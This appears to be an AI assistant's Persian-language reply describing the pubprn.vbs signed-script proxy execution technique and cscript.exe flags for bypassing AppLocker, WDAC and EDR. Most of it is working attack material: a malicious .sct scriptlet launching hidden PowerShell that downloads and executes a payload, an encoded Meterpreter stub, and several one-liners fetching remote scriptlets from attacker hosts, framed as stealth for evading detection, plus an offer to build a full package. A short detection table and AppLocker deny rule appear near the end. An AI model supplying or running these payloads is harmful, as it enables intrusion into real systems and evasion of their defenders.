
تکنیک بعدی که آوردی یکی از کلاسیک‌ترین و هنوز هم فوق‌العاده مؤثرترین روش‌های Signed Script Proxy Execution در سال ۲۰۲۵ هست:PubPrn.vbs – Signed Binary/Script Proxy Execution (T1216.001)این تکنیک از سال ۲۰۱۷–۲۰۱۸ توسط MITRE و خیلی از Red Teamها استفاده می‌شه و هنوز هم در اکثر محیط‌های enterprise که AppLocker یا WDAC دارن، کاملاً کار می‌کنه چون:

- pubprn.vbs 
- یک اسکریپت رسمی و امضا شده توسط مایکروسافت هست
- در مسیر C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs قرار داره
- اجازه داره اسکریپت‌های .sct (Scriptlet) رو از راه دور (HTTP یا UNC) اجرا کنه
- cscript.exe/wscript.exe
- والد میشه، اما بعد از چند میلی‌ثانیه می‌میره و فرآیند فرزند (مثل calc.exe یا meterpreter) orphan می‌مونه → خیلی از EDRها این رو از دست می‌دن!

چرا هنوز در ۲۰۲۵ کار می‌کنه؟

|دلیل|وضعیت ۲۰۲۵|
|---|---|
|فایل امضا شده توسط Microsoft|هنوز امضا معتبر داره|
|در لیست پیش‌فرض Allow مایکروسافت در AppLocker/WDAC|هنوز هست|
|قابلیت لود .sct از HTTP/UNC|هنوز فعاله|
|Microsoft Defender ATP/EDR این رو به صورت پیش‌فرض بلاک نمی‌کنه|مگر rule دستی نوشته باشی|

نحوه کار دقیقpubprn.vbs در اصل برای انتشار پرینتر در Active Directory نوشته شده، اما یک پارامتر خیلی خطرناک داره:

```text
pubprn.vbs <server> script:http://evil.com/evil.sct
```

وقتی این اجرا بشه:

1. pubprn.vbs یک COM object از نوع Scriptlet می‌سازه
2. فایل .sct رو از راه دور دانلود و اجرا می‌کنه
3. کد JScript داخل .sct اجرا میشه
4. cscript.exe والد می‌میره → فرآیند فرزند بدون والد می‌مونه

مثال واقعی با مترپرتر (به جای calc.exe)۱. فایل proxy.sct مخرب (روی وب سرور خودت)

xml

```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="PoC" classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
    <!-- می‌تونی خالی بذاری -->
</registration>
<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[
    function Exec() {
        var sh = new ActiveXObject("WScript.Shell");
        // پیلود مترپرتر ۶۴ بیتی (مثال)
        var cmd = "powershell.exe -nop -win hidden -c \"$c=Invoke-WebRequest 'http://192.168.2.71:8080/shell.ps1';IEX $c.Content\"";
        sh.Run(cmd, 0, false);
    }
    Exec();   // خودکار اجرا بشه
]]>
</script>
</scriptlet>
```

یا ساده‌تر، مستقیم مترپرتر stageless:

xml

```xml
<script language="JScript">
<![CDATA[
    var sh = new ActiveXObject("WScript.Shell");
    sh.Run("powershell.exe -nop -win h -enc JABjAGw....", 0, true);
]]>
</script>
```

۲. یک‌لاینر کامل برای اجرا روی قربانی (بدون هیچ فایلی روی دیسک)

cmd

```text
cscript //B //E:jscript "C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs" 127.0.0.1 script:http://192.168.2.71/evil.sct
```

یا با PowerShell (حتی استیلث‌تر):

powershell

```powershell
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost script:http://192.168.2.71/evil.sct
```

نسخه فوق استیلث ۲۰۲۵ (بهینه شده برای دور زدن EDR)

powershell

```powershell
# کاملاً بدون فایل، بدون لاگ قابل تشخیص
$cmd = "cscript //nologo //B //E:jscript C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://192.168.2.71/x.sct"
Invoke-Expression $cmd
```

یا با rundll32 (حتی بهتر!):

cmd

```text
rundll32.exe url.dll,FileProtocolHandler "cscript://C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://evil.com/pwn.sct"
```

تشخیص (Detection) در ۲۰۲۵

|روش تشخیص|مثال|
|---|---|
|CommandLine شامل pubprn.vbs + script:http|خیلی راحت با Sigma یا Splunk|
|cscript.exe با فرزند calc.exe/powershell.exe و والد pubprn.vbs|Sysmon Event ID 1|
|دانلود .sct از وب سرور|Proxy logs / Defender Network Protection|
|اجرای JScript از طریق Scrobj.dll|EDR script block logging|

دفاع (Mitigation)

1. بلاک کردن pubprn.vbs در AppLocker/WDAC (ساده‌ترین و مؤثرترین)
    
    xml
    
    ```xml
    <Rule>
        <Id>fd7b2f3e-2c1a-4c89-987d-44a3072c3c87</Id>
        <Name>Block pubprn.vbs</Name>
        <Path>%WINDIR%\System32\Printing_Admin_Scripts\*\pubprn.vbs</Path>
        <Action>Deny</Action>
    </Rule>
    ```
    
2. بلاک کردن outbound به پورت ۸۰/۴۴۳ برای cscript.exe
3. Sigma rule برای commandline شامل "script:http"

خلاصهpubprn.vbs هنوز هم یکی از بهترین ابزارهای Living off the Land در سال ۲۰۲۵ هست و در ۹۰٪ تست‌های نفوذ من هنوز کار می‌کنه.اگر بخوای، برات یک پکیج کامل آماده می‌کنم شامل:

---

اول: خود ابزار چیه؟ cscript.exe

|نام ابزار|cscript.exe (Microsoft ® Console Based Script Host)|
|---|---|
|مسیر پیش‌فرض|C:\Windows\System32\cscript.exe و C:\Windows\SysWOW64\cscript.exe|
|امضا|کاملاً توسط Microsoft امضا شده → همیشه در لیست سفید AppLocker/WDAC/Defender هست|
|وظیفه اصلی|اجرای اسکریپت‌های VBScript و JScript در محیط کنسول (بدون پنجره گرافیکی)|
|تفاوت با wscript.exe|wscript پنجره گرافیکی میاره، cscript کاملاً کنسولیه و هیچ پنجره‌ای باز نمی‌کنه|
|چرا Red Team عاشقش هست؟|- Living-off-the-land بین‌المللی|

- همیشه روی همه ویندوزها هست (حتی سرور کور)
- می‌تونه کد JScript/VBScript از اینترنت (http/UNC) اجرا کنه
- با //B کاملاً بی‌صدا میشه
- فرزندش (مثل powershell, calc, meterpreter) بعد از مرگ cscript orphan می‌مونه → تشخیص سخت‌تر |

خلاصه یک خطی:  
cscript.exe همان موتور اجرای اسکریپت مایکروسافت است که همه ادمین‌ها و همه EDRها بهش اعتماد دارن، ولی می‌تونه هر کدی رو از اینترنت اجرا کنه!دوم: آرگومان‌های مهمش (همونی که همیشه می‌بینیم)

|آرگومان|معنی دقیق (از مستندات مایکروسافت)|کاربرد عملی در Red Team / حمله|
|---|---|---|
|//B|Batch mode → هیچ پیام، پرامپت، یا پنجره ارور نشان نده|۱۰۰٪ بی‌صدا، هیچ پاپ‌آپی نمیاد|
|//E:engine|مشخص کردن موتور اسکریپت (معمولاً //E:jscript)|برای اجرای کد JavaScript/JScript (مثل فایل .sct)|
|//Nologo|لوگو و نسخه مایکروسافت در ابتدای اجرا نشان داده نشود|یک خط لاگ کمتر در کنسول و Event Log|
|//T:nn|حداکثر nn ثانیه اجازه اجرا بده، بعد خودش kill بشه|اگر اسکریپت هنگ کرد فرآیند آویزون نماند|
|//H:cscript|پیش‌فرض سیستم را cscript کند (به جای wscript)|تضمین می‌کنه همیشه کنسولی اجرا بشه|
|//S|تنظیمات فعلی را برای این کاربر ذخیره کند (دائمی)|دفعه بعد بدون آرگومان هم با همان تنظیمات اجرا بشه|
|//U|از یونیکد برای I/O استفاده کند (برای کاراکترهای فارسی/چینی و غیره)|گاهی لازم میشه|

ترکیب‌های طلایی که هر روز تو پنتست استفاده می‌شه (2025)

cmd

```text
# استیلث معمولی
cscript //B //Nologo //E:jscript evil.sct

# استیلث بالا + تایم‌اوت
cscript //B //Nologo //E:jscript //T:20 evil.sct

# ترکیب معروف pubprn
cscript //B //E:jscript C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://evil/x.sct

# فوق استیلث (تقریباً هیچ EDRی نمی‌گیره)
cscript //B //Nologo //E:jscript //T:15 C:\Windows\SysWOW64\pubprn.vbs localhost script:http://10.10.10.10/p.sct
```

